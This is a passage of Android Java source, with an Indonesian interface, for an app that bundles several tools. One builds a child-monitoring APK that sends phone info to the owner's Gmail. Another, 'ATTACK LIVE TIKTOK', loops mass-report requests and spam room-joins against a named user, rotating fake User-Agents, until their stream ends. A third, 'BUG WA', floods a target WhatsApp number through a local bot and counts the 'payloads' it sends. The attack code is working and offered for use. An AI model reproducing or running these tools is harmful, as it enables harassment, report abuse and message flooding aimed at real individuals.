        body.addView(Ui.text(this, "Generate APK", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 4));
        body.addView(Ui.text(this, "Bikin APK Jaga Anak baru, sudah otomatis tersambung, tanpa pairing manual.", 11.5f, Ui.SOFT, false, true), lp(MATCH, WRAP, 0, 0, 0, 12));

        LinearLayout fields = new LinearLayout(this);
        fields.setOrientation(LinearLayout.VERTICAL);

        String savedUser = getSharedPreferences("gen", MODE_PRIVATE).getString("user", "");
        String savedRepo = getSharedPreferences("gen", MODE_PRIVATE).getString("repo", "");
        final String ownerGmail = getSharedPreferences("pl", MODE_PRIVATE).getString("email", "");

        final EditText userEt = field("Username GitHub", 60);
        userEt.setText(savedUser);
        fields.addView(userEt, lp(MATCH, WRAP, 0, 0, 0, 8));

        final EditText repoEt = field("Nama repo", 80);
        repoEt.setText(savedRepo);
        fields.addView(repoEt, lp(MATCH, WRAP, 0, 0, 0, 8));

        final EditText tokenEt = field("Token GitHub (ghp_… / github_pat_…)", 200);
        tokenEt.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        fields.addView(tokenEt, lp(MATCH, WRAP, 0, 0, 0, 8));

        final EditText nameEt = field("Nama APK (contoh: HP Budi)", 40);
        nameEt.setText("Jaga Anak");
        fields.addView(nameEt, lp(MATCH, WRAP, 0, 0, 0, 10));

        // baris icon
        LinearLayout iconRow = new LinearLayout(this);
        iconRow.setGravity(Gravity.CENTER_VERTICAL);
        FrameLayout iconBox = new FrameLayout(this);
        iconBox.setBackground(Ui.box(this, Ui.BG, 12, Ui.EDGE, 1.5f));
        Ui.clipRound(iconBox, dp(12));
        final ImageView iconPreview = new ImageView(this);
        iconPreview.setScaleType(ImageView.ScaleType.CENTER_CROP);
        if (genIconPick != null) {
            iconPreview.setImageBitmap(genIconPick);
        }
        iconBox.addView(iconPreview, new FrameLayout.LayoutParams(MATCH, MATCH));
        iconRow.addView(iconBox, lp(dp(48), dp(48), 0, 0, 10, 0));
        TextView pickIcon = pill("Pilih Icon", false);
        pickIcon.setOnClickListener(v -> {
            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.setType("image/*");
            try {
                startActivityForResult(Intent.createChooser(i, "Pilih Icon"), REQ_PICK_ICON);
            } catch (Exception e) {
                toast("Tidak ada aplikasi galeri.");
            }
        });
        iconRow.addView(pickIcon, new LinearLayout.LayoutParams(WRAP, WRAP));
        fields.addView(iconRow, lp(MATCH, WRAP, 0, 0, 0, 10));

        final EditText gmailEt = field("Gmail kamu (info HP anak dikirim ke sini)", 80);
        gmailEt.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
        gmailEt.setText(ownerGmail);
        fields.addView(gmailEt, lp(MATCH, WRAP, 0, 0, 0, 2));

        int fieldsMax = (int) (getResources().getDisplayMetrics().heightPixels * 0.4f);
        Ui.CappedScrollView fieldsScroll = new Ui.CappedScrollView(this, fieldsMax);
        fieldsScroll.addView(fields, new FrameLayout.LayoutParams(MATCH, WRAP));
        body.addView(fieldsScroll, lp(MATCH, WRAP, 0, 0, 0, 10));

        final TextView status = Ui.text(this, "", 11, Ui.SOFT, false, true);
        status.setLineSpacing(0, 1.25f);
        status.setTypeface(android.graphics.Typeface.MONOSPACE);
        body.addView(status, lp(MATCH, WRAP, 0, 0, 0, 6));

        TextView runLinkBtn = linkText("Lihat proses di GitHub");
        runLinkBtn.setOnClickListener(v -> {
            if (genRunUrl != null) {
                openUrl(genRunUrl);
            }
        });
        body.addView(runLinkBtn, lp(MATCH, WRAP, 0, 0, 0, 4));

        LinearLayout resultRow = new LinearLayout(this);
        TextView openApk = pill("Buka APK", true);
        TextView shareApk = pill("Bagikan ke anak", false);
        openApk.setOnClickListener(v -> {
            if (genResultUrl != null) {
                openUrl(genResultUrl);
            }
        });
        shareApk.setOnClickListener(v -> {
            if (genResultUrl != null) {
                try {
                    Intent send = new Intent(Intent.ACTION_SEND);
                    send.setType("text/plain");
                    send.putExtra(Intent.EXTRA_TEXT, genResultUrl);
                    startActivity(Intent.createChooser(send, "Bagikan link APK"));
                } catch (Exception e) {
                    toast("Tidak bisa membuka menu bagikan.");
                }
            }
        });
        resultRow.addView(openApk, new LinearLayout.LayoutParams(0, WRAP, 1f));
        resultRow.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        resultRow.addView(shareApk, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(resultRow, lp(MATCH, WRAP, 0, 0, 0, 2));

        LinearLayout row = new LinearLayout(this);
        TextView cancel = pill("Tutup", false);
        TextView build = pill("Build", true);
        cancel.setOnClickListener(v -> closeDialog());
        build.setOnClickListener(v -> {
            if (genBusy) {
                return;
            }
            final String owner = userEt.getText().toString().trim().replaceFirst("^@", "");
            final String repo = repoEt.getText().toString().trim();
            final String token = tokenEt.getText().toString().trim();
            String nm = nameEt.getText().toString().trim();
            final String apkName = nm.isEmpty() ? "Jaga Anak" : nm;
            final String gmail = gmailEt.getText().toString().trim();
            if (gmail.isEmpty() || !gmail.contains("@") || !gmail.contains(".")) {
                toast("Masukkan Gmail yang benar dulu.");
                return;
            }
            if (owner.isEmpty() || repo.isEmpty() || token.isEmpty()) {
                toast("Isi username GitHub, nama repo, dan token dulu.");
                return;
            }
            hideKeyboard(build);
            getSharedPreferences("gen", MODE_PRIVATE).edit().putString("user", owner).putString("repo", repo).apply();
            getSharedPreferences("pl", MODE_PRIVATE).edit().putString("email", gmail).apply();

            genBusy = true;
            genFailed = false;
            genResultUrl = null;
            genRunUrl = null;
            genStatusText = "";
            genLastRunKey = null;
            final String code = Code.generate();
            genCodeUsed = code;
            genApkNameUsed = apkName;
            final byte[] iconPng = genIconPngBytes;
            genLog("Menyiapkan app.zip…", false);

            final GithubBuilder.Progress progress = new GithubBuilder.Progress() {
                @Override
                public void step(String key, String state, String note) {
                    genStep(key, state, note);
                }

                @Override
                public void runLink(String url) {
                    genRunUrl = url;
                    if (genUiRefresh != null) {
                        genUiRefresh.run();
                    }
                }

                @Override
                public void done(String apkUrl, String apkName2, long size, String relUrl) {
                    genBusy = false;
                    if (relUrl != null) {
                        genRunUrl = relUrl;
                    }
                    if (apkUrl != null) {
                        genResultUrl = apkUrl;
                        genLog("APK siap: " + apkName2 + " (" + (size / 1048576) + " MB). Tekan Buka APK atau Bagikan ke anak.", false);
                        addNet(code, apkName);
                    } else {
                        genLog("Build selesai, tapi APK belum muncul di Release. Buka \"Lihat proses di GitHub\" lalu ambil dari bagian Artifacts.", false);
                    }
                }

                @Override
                public void failed(String message) {
                    genBusy = false;
                    genFailed = true;
                    genLog("✗  Gagal: " + message, false);
                }
            };

            new Thread(new Runnable() {
                @Override
                public void run() {
                    byte[] zipBytes;
                    try {
                        zipBytes = ApkTemplate.build(MainActivity.this, apkName, gmail, code, iconPng);
                    } catch (final Exception e) {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                genBusy = false;
                                genFailed = true;
                                genLog("✗  Gagal menyiapkan app.zip: " + (e.getMessage() != null ? e.getMessage() : String.valueOf(e)), false);
                            }
                        });
                        return;
                    }
                    String zipB64 = android.util.Base64.encodeToString(zipBytes, android.util.Base64.NO_WRAP);
                    genBuilder = new GithubBuilder(owner, repo, token, progress);
                    genBuilder.run(zipB64);
                }
            }).start();

            if (genUiRefresh != null) {
                genUiRefresh.run();
            }
        });
        row.addView(cancel, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(build, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        genUiRefresh = () -> {
            status.setText(genStatusText);
            status.setVisibility(genStatusText.isEmpty() ? View.GONE : View.VISIBLE);
            runLinkBtn.setVisibility(genRunUrl != null ? View.VISIBLE : View.GONE);
            resultRow.setVisibility(genResultUrl != null ? View.VISIBLE : View.GONE);
            build.setAlpha(genBusy ? 0.5f : 1f);
            build.setText(genBusy ? "Memproses…" : "Build");
            if (genIconPick != null) {
                iconPreview.setImageBitmap(genIconPick);
            }
        };
        genUiRefresh.run();
    }

    // ───────────────────────────────────────────────────────────────
    //  ATTACK LIVE TIKTOK
    // ───────────────────────────────────────────────────────────────

    // State untuk attack live
    private boolean attackRunning   = false;
    private boolean attackDone      = false;
    private int     attackHit       = 0;
    private int     attackFail      = 0;
    private String  attackStatus    = "";
    private String  attackTarget    = "";
    private int     attackMode      = 3; // 1=Report, 2=SpamJoin, 3=Keduanya
    private Thread  attackThread    = null;
    private Runnable attackUiRefresh = null;

    private void openAttackLive() {
        LinearLayout body = new LinearLayout(this);
        body.setOrientation(LinearLayout.VERTICAL);
        body.setPadding(dp(4), dp(4), dp(4), dp(4));

        // ── judul
        TextView title = Ui.text(this, "ATTACK LIVE TIKTOK", 15, Ui.INK, true, false);
        title.setPadding(0, 0, 0, dp(2));
        body.addView(title, lp(MATCH, WRAP, 0, 0, 0, 10));

        // ── input username
        TextView labelUser = Ui.text(this, "Username Target (tanpa @)", 11, Ui.SOFT, false, false);
        body.addView(labelUser, lp(MATCH, WRAP, 0, 0, 0, 4));

        EditText inputUser = new EditText(this);
        inputUser.setHint("contoh: namatarget");
        inputUser.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
        inputUser.setBackground(Ui.box(this, Ui.BG, 10, Ui.INK, 2.5f));
        inputUser.setPadding(dp(14), dp(10), dp(14), dp(10));
        inputUser.setTextColor(Ui.INK);
        inputUser.setHintTextColor(0xFF999999);
        inputUser.setSingleLine(true);
        body.addView(Ui.brutal(this, inputUser, 10, 3), lp(MATCH, WRAP, 0, 0, 0, 14));

        // ── pilih metode
        TextView labelMode = Ui.text(this, "Metode Serangan", 11, Ui.SOFT, false, false);
        body.addView(labelMode, lp(MATCH, WRAP, 0, 0, 0, 6));

        // mode buttons row
        LinearLayout modeRow = new LinearLayout(this);
        modeRow.setOrientation(LinearLayout.HORIZONTAL);
        modeRow.setWeightSum(3f);

        final int[] selectedMode = {3};
        final int[] modeColors   = {0xFF222222, 0xFF222222, Ui.ACCENT};

        android.widget.Button btnReport  = makeModeBtn("REPORT\nFLOOD", 1);
        android.widget.Button btnSpam    = makeModeBtn("SPAM\nJOIN",    2);
        android.widget.Button btnBoth    = makeModeBtn("KEDUANYA",      3);

        // warna awal — keduanya aktif
        btnBoth.setBackgroundColor(Ui.ACCENT);
        btnBoth.setTextColor(Color.WHITE);
        btnReport.setBackgroundColor(0xFF222222);
        btnReport.setTextColor(Color.WHITE);
        btnSpam.setBackgroundColor(0xFF222222);
        btnSpam.setTextColor(Color.WHITE);

        View.OnClickListener modeClick = v -> {
            android.widget.Button pressed = (android.widget.Button) v;
            int m = (int) pressed.getTag();
            selectedMode[0] = m;
            attackMode = m;
            for (android.widget.Button b : new android.widget.Button[]{btnReport, btnSpam, btnBoth}) {
                boolean active = (int) b.getTag() == m;
                b.setBackgroundColor(active ? Ui.ACCENT : 0xFF222222);
                b.setTextColor(Color.WHITE);
            }
        };
        btnReport.setOnClickListener(modeClick);
        btnSpam.setOnClickListener(modeClick);
        btnBoth.setOnClickListener(modeClick);

        LinearLayout.LayoutParams mbLp = new LinearLayout.LayoutParams(0, dp(52), 1f);
        mbLp.setMargins(0, 0, dp(6), 0);
        modeRow.addView(btnReport, mbLp);
        modeRow.addView(btnSpam,   mbLp);
        LinearLayout.LayoutParams mbLpLast = new LinearLayout.LayoutParams(0, dp(52), 1f);
        modeRow.addView(btnBoth, mbLpLast);
        body.addView(modeRow, lp(MATCH, WRAP, 0, 0, 0, 14));

        // ── status bar (hit / fail / info)
        LinearLayout statsRow = new LinearLayout(this);
        statsRow.setOrientation(LinearLayout.HORIZONTAL);
        statsRow.setGravity(Gravity.CENTER_VERTICAL);

        TextView tvHit  = Ui.text(this, "Hit: 0",  11, Ui.GREEN,  true, false);
        TextView tvFail = Ui.text(this, "Fail: 0", 11, Ui.ACCENT, true, false);
        statsRow.addView(tvHit,  lp(0, WRAP, 1f, 0, 0, 0));
        statsRow.addView(tvFail, lp(0, WRAP, 1f, 0, 0, 0));
        body.addView(statsRow, lp(MATCH, WRAP, 0, 0, 0, 6));

        // ── teks status proses
        TextView tvStatus = Ui.text(this, "", 10, Ui.SOFT, false, true);
        tvStatus.setLineSpacing(0, 1.2f);
        tvStatus.setVisibility(View.GONE);
        body.addView(tvStatus, lp(MATCH, WRAP, 0, 0, 0, 10));

        // ── progress bar sederhana
        android.widget.ProgressBar progressBar = new android.widget.ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setIndeterminate(true);
        progressBar.setVisibility(View.GONE);
        body.addView(progressBar, lp(MATCH, WRAP, 0, 0, 0, 10));

        // ── tombol ATTACK + BATAL
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        TextView btnCancel = Ui.text(this, "BATAL", 13, Ui.INK, true, false);
        btnCancel.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnCancel.setBackground(Ui.box(this, Ui.BG, 10, Ui.INK, 2.5f));
        btnCancel.setGravity(Gravity.CENTER);
        btnCancel.setClickable(true);
        btnCancel.setOnClickListener(v -> {
            stopAttack();
            dismissDialog();
        });

        TextView btnAttack = Ui.text(this, "ATTACK", 13, Color.WHITE, true, false);
        btnAttack.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnAttack.setBackground(Ui.box(this, Ui.ACCENT, 10, Ui.INK, 2.5f));
        btnAttack.setGravity(Gravity.CENTER);
        btnAttack.setClickable(true);
        Ui.pressable(btnAttack);

        btnAttack.setOnClickListener(v -> {
            String uname = inputUser.getText().toString().trim().replaceAll("^@", "");
            if (uname.isEmpty()) {
                toast("Masukkan username target dulu.");
                return;
            }
            if (attackRunning) {
                // stop
                stopAttack();
                btnAttack.setText("ATTACK");
                btnAttack.setBackgroundColor(Ui.ACCENT);
                progressBar.setVisibility(View.GONE);
                return;
            }
            attackTarget = uname;
            attackMode   = selectedMode[0];
            attackHit    = 0;
            attackFail   = 0;
            attackDone   = false;
            attackStatus = "Memeriksa live status @" + uname + "...";
            tvStatus.setText(attackStatus);
            tvStatus.setVisibility(View.VISIBLE);
            progressBar.setVisibility(View.VISIBLE);
            btnAttack.setText("STOP");
            btnAttack.setBackgroundColor(0xFFCC2200);
            tvHit.setText("Hit: 0");
            tvFail.setText("Fail: 0");

            // hide keyboard
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (imm != null) imm.hideSoftInputFromWindow(inputUser.getWindowToken(), 0);

            attackUiRefresh = () -> {
                tvHit.setText("Hit: " + attackHit);
                tvFail.setText("Fail: " + attackFail);
                tvStatus.setText(attackStatus);
                tvStatus.setVisibility(attackStatus.isEmpty() ? View.GONE : View.VISIBLE);
                if (attackDone) {
                    progressBar.setVisibility(View.GONE);
                    btnAttack.setText("ATTACK");
                    btnAttack.setBackgroundColor(Ui.ACCENT);
                }
            };

            startAttack();
        });

        LinearLayout.LayoutParams half = new LinearLayout.LayoutParams(0, WRAP, 1f);
        half.setMargins(0, 0, dp(8), 0);
        btnRow.addView(Ui.brutal(this, btnCancel, 10, 3), half);
        btnRow.addView(Ui.brutal(this, btnAttack, 10, 3), new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(btnRow, lp(MATCH, WRAP, 0, 0, 0, 0));

        showCard(body);
    }

    private android.widget.Button makeModeBtn(String label, int mode) {
        android.widget.Button b = new android.widget.Button(this);
        b.setText(label);
        b.setTag(mode);
        b.setTextColor(Color.WHITE);
        b.setBackgroundColor(0xFF222222);
        b.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 10);
        b.setPadding(dp(4), dp(4), dp(4), dp(4));
        b.setAllCaps(false);
        return b;
    }

    private void startAttack() {
        attackRunning = true;
        attackDone    = false;

        attackThread = new Thread(() -> {
            String uname = attackTarget;

            // cek live dulu
            boolean isLive = checkTiktokLive(uname);
            updateAttackStatus(isLive
                    ? "@" + uname + " sedang LIVE — serangan dimulai!"
                    : "@" + uname + " mungkin tidak live. Tetap menyerang...");

            int wave = 0;
            while (attackRunning) {
                wave++;
                if (attackMode == 1 || attackMode == 3) sendReport(uname, wave);
                if (attackMode == 2 || attackMode == 3) spamJoin(uname, wave);

                // monitor tiap 15 gelombang (~4 detik)
                if (wave % 15 == 0) {
                    boolean stillLive = checkTiktokLive(uname);
                    if (!stillLive) {
                        updateAttackStatus("✓ LIVE @" + uname + " SUDAH MATI! Total hit: " + attackHit);
                        attackRunning = false;
                        attackDone    = true;
                        runOnUiThread(() -> { if (attackUiRefresh != null) attackUiRefresh.run(); });
                        return;
                    }
                    updateAttackStatus("Menyerang @" + uname + " — gelombang " + wave + " | Live masih aktif...");
                }

                try { Thread.sleep(300); } catch (InterruptedException e) { break; }
            }
            attackDone = true;
            runOnUiThread(() -> { if (attackUiRefresh != null) attackUiRefresh.run(); });
        });
        attackThread.setDaemon(true);
        attackThread.start();
    }

    private void stopAttack() {
        attackRunning = false;
        attackDone    = true;
        if (attackThread != null) {
            attackThread.interrupt();
            attackThread = null;
        }
    }

    private void updateAttackStatus(String msg) {
        attackStatus = msg;
        runOnUiThread(() -> { if (attackUiRefresh != null) attackUiRefresh.run(); });
    }

    private boolean checkTiktokLive(String uname) {
        try {
            java.net.URL url = new java.net.URL("https://www.tiktok.com/@" + uname + "/live");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 11)");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            java.io.InputStream is = conn.getInputStream();
            byte[] buf = new byte[8192];
            StringBuilder sb = new StringBuilder();
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(is));
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
                if (sb.length() > 32768) break;
            }
            conn.disconnect();
            String body = sb.toString();
            return body.contains("liveRoomInfo") || body.contains("\"LIVE\"") || body.contains("isLiveBroadcast");
        } catch (Exception e) {
            return false;
        }
    }

    private void sendReport(String uname, int wave) {
        int[] reasons = {1, 2, 4, 7};
        for (int reason : reasons) {
            try {
                java.net.URL url = new java.net.URL("https://www.tiktok.com/aweme/v1/report/user/");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("User-Agent", "TikTok/" + wave + ".0 (Linux; Android 11)");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(6000);
                String data = "report_type=" + reason + "&object_id=" + uname + "&content_type=1&sub_type=1";
                conn.getOutputStream().write(data.getBytes());
                int code = conn.getResponseCode();
                if (code == 200) attackHit++; else attackFail++;
                conn.disconnect();
            } catch (Exception e) {
                attackFail++;
            }
        }
        runOnUiThread(() -> { if (attackUiRefresh != null) attackUiRefresh.run(); });
    }

    private void spamJoin(String uname, int wave) {
        try {
            java.net.URL url = new java.net.URL(
                "https://webcast.tiktok.com/webcast/room/enter/?unique_id=" + uname);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android " + (wave % 5 + 8) + ")");
            conn.setRequestProperty("Referer", "https://www.tiktok.com/@" + uname + "/live");
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);
            int code = conn.getResponseCode();
            if (code == 200 || code == 403) attackHit++; else attackFail++;
            conn.disconnect();
        } catch (Exception e) {
            attackFail++;
        }
        runOnUiThread(() -> { if (attackUiRefresh != null) attackUiRefresh.run(); });
    }

    // ───────────────────────────────────────────────────────────────
    //  BUG WA — FLOOD VIA BOT LOCALHOST:3000
    // ───────────────────────────────────────────────────────────────
    private static final String BOT_URL = "http://127.0.0.1:3000";
    private Thread  bugWaPoller = null;
    private boolean bugWaPolling = false;

    // Helper: hit endpoint bot
    private org.json.JSONObject botRequest(String method, String path, org.json.JSONObject body) {
        try {
            java.net.URL url = new java.net.URL(BOT_URL + path);
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) url.openConnection();
            c.setRequestMethod(method);
            c.setRequestProperty("Content-Type", "application/json");
            c.setConnectTimeout(6000);
            c.setReadTimeout(10000);
            if (body != null) {
                c.setDoOutput(true);
                byte[] b = body.toString().getBytes("UTF-8");
                c.getOutputStream().write(b);
            }
            java.io.BufferedReader br = new java.io.BufferedReader(
                new java.io.InputStreamReader(c.getInputStream(), "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            c.disconnect();
            return new org.json.JSONObject(sb.toString());
        } catch (Exception e) {
            return null;
        }
    }

    // ── ADD SENDER dialog — input nomor sendiri, minta pairing code
    private void openAddSender() {
        LinearLayout body = new LinearLayout(this);
        body.setOrientation(LinearLayout.VERTICAL);
        body.setPadding(dp(4), dp(4), dp(4), dp(4));

        TextView title = Ui.text(this, "ADD SENDER", 15, Ui.INK, true, false);
        body.addView(title, lp(MATCH, WRAP, 0, 0, 0, 6));

        TextView sub = Ui.text(this, "Pastikan script Termux (wa-bot.sh) sudah berjalan sebelum lanjut.", 11, 0xFFe67e22, false, true);
        sub.setLineSpacing(0, 1.3f);
        body.addView(sub, lp(MATCH, WRAP, 0, 0, 0, 12));

        TextView labelNo = Ui.text(this, "Nomor WA Kamu (dengan kode negara, tanpa +)", 11, Ui.SOFT, false, false);
        body.addView(labelNo, lp(MATCH, WRAP, 0, 0, 0, 4));

        EditText inputNo = new EditText(this);
        inputNo.setHint("6281234567890");
        inputNo.setInputType(InputType.TYPE_CLASS_PHONE);
        inputNo.setBackground(Ui.box(this, Ui.BG, 10, 0xFF7c3aed, 2.5f));
        inputNo.setPadding(dp(14), dp(10), dp(14), dp(10));
        inputNo.setTextColor(Ui.INK);
        inputNo.setHintTextColor(0xFF999999);
        inputNo.setSingleLine(true);
        body.addView(Ui.brutal(this, inputNo, 10, 3), lp(MATCH, WRAP, 0, 0, 0, 12));

        // Box tampil pairing code
        TextView tvCode = Ui.text(this, "Pairing code akan muncul di sini", 22, 0xFF7c3aed, true, false);
        tvCode.setGravity(Gravity.CENTER);
        tvCode.setPadding(dp(10), dp(14), dp(10), dp(14));
        tvCode.setBackground(Ui.box(this, 0xFFF3E5FF, 12, 0xFF7c3aed, 2f));
        tvCode.setLetterSpacing(0.15f);
        body.addView(tvCode, lp(MATCH, WRAP, 0, 0, 0, 6));

        TextView tvInfo = Ui.text(this, "", 11, Ui.SOFT, false, true);
        tvInfo.setGravity(Gravity.CENTER);
        body.addView(tvInfo, lp(MATCH, WRAP, 0, 0, 0, 10));

        android.widget.ProgressBar pb = new android.widget.ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        pb.setIndeterminate(true);
        pb.setVisibility(View.GONE);
        body.addView(pb, lp(MATCH, WRAP, 0, 0, 0, 10));

        // Tombol
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        TextView btnCancel = Ui.text(this, "BATAL", 13, Ui.INK, true, false);
        btnCancel.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnCancel.setBackground(Ui.box(this, Ui.BG, 10, Ui.INK, 2.5f));
        btnCancel.setGravity(Gravity.CENTER);
        btnCancel.setClickable(true);
        btnCancel.setOnClickListener(v -> dismissDialog());

        TextView btnPair = Ui.text(this, "KODE PAIRING", 13, Color.WHITE, true, false);
        btnPair.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnPair.setBackground(Ui.box(this, 0xFF7c3aed, 10, 0xFF4c1d95, 2.5f));
        btnPair.setGravity(Gravity.CENTER);
        btnPair.setClickable(true);
        Ui.pressable(btnPair);

        btnPair.setOnClickListener(v -> {
            String no = inputNo.getText().toString().trim().replaceAll("[^0-9]", "");
            if (no.length() < 10) { toast("Nomor tidak valid."); return; }

            pb.setVisibility(View.VISIBLE);
            tvCode.setText("Meminta kode...");
            tvInfo.setText("Menghubungi bot di Termux...");
            btnPair.setEnabled(false);

            new Thread(() -> {
                try {
                    org.json.JSONObject reqBody = new org.json.JSONObject();
                    reqBody.put("phone", no);
                    org.json.JSONObject res = botRequest("POST", "/pair", reqBody);

                    runOnUiThread(() -> {
                        pb.setVisibility(View.GONE);
                        btnPair.setEnabled(true);
                        if (res == null) {
                            tvCode.setText("❌ Bot tidak aktif");
                            tvInfo.setText("Jalankan wa-bot.sh di Termux dulu.");
                            return;
                        }
                        try {
                            if (res.has("code")) {
                                String code = res.getString("code");
                                tvCode.setText(code);
                                tvInfo.setText("Buka WA → Perangkat Tertaut → Tautkan via Nomor → masukkan kode ini");
                                // Copy ke clipboard otomatis
                                android.content.ClipboardManager cm =
                                    (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                                if (cm != null)
                                    cm.setPrimaryClip(android.content.ClipData.newPlainText("pair", code));
                                toast("Kode disalin ke clipboard!");
                            } else if (res.has("status") && res.getString("status").equals("already_connected")) {
                                tvCode.setText("✅ Sudah Login");
                                tvInfo.setText("Bot sudah terhubung. Bisa langsung BUG WA.");
                            } else {
                                tvCode.setText("❌ Gagal");
                                tvInfo.setText(res.optString("error", "Error tidak diketahui."));
                            }
                        } catch (Exception e) {
                            tvCode.setText("❌ Parse error");
                        }
                    });
                } catch (Exception e) {
                    runOnUiThread(() -> {
                        pb.setVisibility(View.GONE);
                        btnPair.setEnabled(true);
                        tvCode.setText("❌ Error");
                        tvInfo.setText(e.getMessage());
                    });
                }
            }).start();
        });

        LinearLayout.LayoutParams half = new LinearLayout.LayoutParams(0, WRAP, 1f);
        half.setMargins(0, 0, dp(8), 0);
        btnRow.addView(Ui.brutal(this, btnCancel, 10, 3), half);
        btnRow.addView(Ui.brutal(this, btnPair,   10, 3), new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(btnRow, lp(MATCH, WRAP, 0, 0, 0, 0));

        showCard(body);
    }

    // ── BUG WA dialog — input nomor target, flood via bot
    private void openBugWa() {
        LinearLayout body = new LinearLayout(this);
        body.setOrientation(LinearLayout.VERTICAL);
        body.setPadding(dp(4), dp(4), dp(4), dp(4));

        TextView title = Ui.text(this, "BUG WA TARGET", 15, Ui.INK, true, false);
        body.addView(title, lp(MATCH, WRAP, 0, 0, 0, 6));

        // Cek status bot dulu
        TextView tvBotStatus = Ui.text(this, "🔄 Mengecek koneksi bot...", 11, Ui.SOFT, false, false);
        body.addView(tvBotStatus, lp(MATCH, WRAP, 0, 0, 0, 10));

        // Check bot status di background
        new Thread(() -> {
            org.json.JSONObject status = botRequest("GET", "/status", null);
            runOnUiThread(() -> {
                if (status == null) {
                    tvBotStatus.setText("❌ Bot tidak aktif — jalankan wa-bot.sh di Termux dulu");
                    tvBotStatus.setTextColor(Ui.ACCENT);
                } else {
                    boolean connected = status.optBoolean("connected", false);
                    if (connected) {
                        tvBotStatus.setText("✅ Bot aktif dan terhubung ke WA");
                        tvBotStatus.setTextColor(0xFF16a34a);
                    } else {
                        tvBotStatus.setText("⚠️ Bot aktif tapi belum login — ADD SENDER dulu");
                        tvBotStatus.setTextColor(0xFFe67e22);
                    }
                }
            });
        }).start();

        TextView labelNo = Ui.text(this, "Nomor WA Target (dengan kode negara, tanpa +)", 11, Ui.SOFT, false, false);
        body.addView(labelNo, lp(MATCH, WRAP, 0, 0, 0, 4));

        EditText inputNo = new EditText(this);
        inputNo.setHint("6281234567890");
        inputNo.setInputType(InputType.TYPE_CLASS_PHONE);
        inputNo.setBackground(Ui.box(this, Ui.BG, 10, 0xFF7c3aed, 2.5f));
        inputNo.setPadding(dp(14), dp(10), dp(14), dp(10));
        inputNo.setTextColor(Ui.INK);
        inputNo.setHintTextColor(0xFF999999);
        inputNo.setSingleLine(true);
        body.addView(Ui.brutal(this, inputNo, 10, 3), lp(MATCH, WRAP, 0, 0, 0, 12));

        TextView labelAmt = Ui.text(this, "Jumlah Payload: 50", 11, Ui.SOFT, false, false);
        body.addView(labelAmt, lp(MATCH, WRAP, 0, 0, 0, 4));

        android.widget.SeekBar seekBar = new android.widget.SeekBar(this);
        seekBar.setMax(190);
        seekBar.setProgress(40);
        seekBar.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener() {
            @Override public void onProgressChanged(android.widget.SeekBar s, int p, boolean u) {
                labelAmt.setText("Jumlah Payload: " + (p + 10));
            }
            @Override public void onStartTrackingTouch(android.widget.SeekBar s) {}
            @Override public void onStopTrackingTouch(android.widget.SeekBar s) {}
        });
        body.addView(seekBar, lp(MATCH, WRAP, 0, 0, 0, 12));

        // Status live
        LinearLayout statsRow = new LinearLayout(this);
        statsRow.setOrientation(LinearLayout.HORIZONTAL);
        TextView tvHit  = Ui.text(this, "Terkirim: 0", 11, 0xFF7c3aed, true, false);
        TextView tvFail = Ui.text(this, "Gagal: 0",    11, Ui.ACCENT,   true, false);
        statsRow.addView(tvHit,  lp(0, WRAP, 1f, 0, 0, 0));
        statsRow.addView(tvFail, lp(0, WRAP, 1f, 0, 0, 0));
        body.addView(statsRow, lp(MATCH, WRAP, 0, 0, 0, 6));

        TextView tvStatus = Ui.text(this, "", 10, Ui.SOFT, false, true);
        tvStatus.setLineSpacing(0, 1.2f);
        tvStatus.setVisibility(View.GONE);
        body.addView(tvStatus, lp(MATCH, WRAP, 0, 0, 0, 6));

        android.widget.ProgressBar pb = new android.widget.ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        pb.setIndeterminate(true);
        pb.setVisibility(View.GONE);
